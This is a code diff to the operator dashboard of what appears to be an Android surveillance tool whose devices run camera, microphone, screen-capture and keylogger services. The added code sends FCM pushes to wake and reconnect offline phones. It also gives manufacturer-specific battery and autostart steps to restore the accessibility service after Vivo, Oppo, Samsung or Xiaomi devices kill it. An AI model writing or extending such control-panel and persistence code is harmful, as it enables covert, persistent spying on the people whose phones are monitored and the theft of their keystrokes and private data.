@@ -169,6 +169,8 @@
 
             <button class="btn" style="background:rgba(255,60,60,0.15);border-color:rgba(255,60,60,0.4);color:#ff4444;font-weight:bold;" onclick="killSwitch('${device.deviceId}')" title="Force-stop all active services (camera, mic, screen, keylogger)">&#x26A0; KILL SWITCH</button>
 
+            ${device.status === 'offline' || device.status === 'sleep' ? `<button class="btn" style="background:rgba(0,200,100,0.15);border-color:rgba(0,200,100,0.4);color:#0c6;font-weight:bold;" onclick="wakeDevice('${device.deviceId}')" title="Send FCM push to restart the app">&#x1F4E1; WAKE</button>` : ''}
+
             ${device.status === 'offline' ? `<button class="btn" style="background:rgba(255,60,60,0.1);border-color:rgba(255,60,60,0.3);color:#f44;" onclick="deleteDevice('${device.deviceId}')">&#x1F5D1; DELETE</button>` : ''}
           </div>
         </div>
@@ -196,6 +198,19 @@
       }
     }
 
+    async function wakeDevice(deviceId) {
+      try {
+        const res = await api.request('/device/' + deviceId + '/wake', { method: 'POST' });
+        if (res.success) {
+          api.showToast('📡 Wake push sent — device should reconnect in ~10s', 'success');
+        } else {
+          api.showToast('Wake failed: ' + (res.error || res.message), 'error');
+        }
+      } catch (e) {
+        api.showToast('Wake failed: ' + e.message, 'error');
+      }
+    }
+
     // WebSocket for live device state updates
     (function connectDashboardWs() {
       const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
@@ -216,6 +231,48 @@
               renderDevices();
               const onlineCount = devices.filter(d => d.status === 'online' || d.status === 'sleep').length;
               document.getElementById('device-count').textContent = onlineCount + '/' + devices.length;
+            }
+          }
+
+          // Accessibility status alerts — show OEM-specific fix guidance
+          if (msg.type === 'accessibility_status' && msg.deviceId) {
+            const card = document.getElementById('device-' + msg.deviceId);
+            if (!card) return;
+
+            // Remove existing alert if any
+            const existing = card.querySelector('.acc-alert');
+            if (existing) existing.remove();
+
+            if (msg.connected === false) {
+              const reason = msg.reason || 'unknown';
+              const mfg = (msg.manufacturer || '').toUpperCase();
+              let fixGuide = msg.message || 'Accessibility service not running.';
+
+              // OEM-specific guidance
+              if (reason === 'process_killed') {
+                if (mfg.includes('VIVO') || mfg.includes('OPPO') || mfg.includes('REALME')) {
+                  fixGuide = `⚠️ ${mfg} killed accessibility. Fix: Settings → Battery → Background Power → Allow. Then toggle Accessibility OFF → ON.`;
+                } else if (mfg.includes('SAMSUNG')) {
+                  fixGuide = `⚠️ Samsung killed accessibility. Fix: Settings → Battery → Sleeping apps → Remove this app. Then toggle Accessibility OFF → ON.`;
+                } else if (mfg.includes('XIAOMI') || mfg.includes('POCO') || mfg.includes('REDMI')) {
+                  fixGuide = `⚠️ ${mfg} killed accessibility. Fix: Settings → Apps → Autostart → Enable. Then toggle Accessibility OFF → ON.`;
+                }
+              }
+
+              const alertDiv = document.createElement('div');
+              alertDiv.className = 'acc-alert';
+              alertDiv.style.cssText = 'background:rgba(255,60,60,0.15);border:1px solid rgba(255,60,60,0.4);border-radius:6px;padding:8px 12px;margin:8px 0;font-size:12px;color:#ff6b6b;';
+              alertDiv.innerHTML = `<strong>🔴 Accessibility Dead</strong><br>${fixGuide}`;
+              card.querySelector('.device-actions')?.before(alertDiv);
+            }
+
+            // Battery optimization warning (service alive but at risk)
+            if (msg.warning && msg.batteryOptimized) {
+              const alertDiv = document.createElement('div');
+              alertDiv.className = 'acc-alert';
+              alertDiv.style.cssText = 'background:rgba(255,165,0,0.15);border:1px solid rgba(255,165,0,0.4);border-radius:6px;padding:8px 12px;margin:8px 0;font-size:12px;color:#ffa500;';
+              alertDiv.innerHTML = `<strong>⚠️ At Risk</strong><br>${msg.message}`;
+              card.querySelector('.device-actions')?.before(alertDiv);
             }
           }
         } catch (e) { /* ignore */ }
